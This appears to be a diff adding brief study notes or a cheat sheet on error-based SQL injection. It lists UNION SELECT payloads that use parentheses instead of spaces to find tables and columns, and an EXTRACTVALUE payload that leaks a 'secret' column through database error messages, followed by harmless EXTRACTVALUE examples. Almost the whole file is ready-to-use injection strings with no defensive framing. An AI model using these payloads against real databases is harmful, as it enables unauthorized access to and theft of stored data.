@@ -1,0 +1,21 @@
+Error Based:
+
+---> Table
+
+id=(1)union(select(id)from(cats))
+id=(1)union(select(id)from(admins))
+
+---> Column
+
+(1)union(select(id)from(users))
+(1)union(select(ids)from(users))
+
+---> Data
+
+id=extractvalue(0,concat(0,(select(secret)from(cats)where(id)like(6))))
+
+**extractvalue usage example:
+
+SELECT EXTRACTVALUE('<user>example</user>', '/user')
+
+SELECT EXTRACTVALUE(0, concat(0,(SELECT 'roman')))
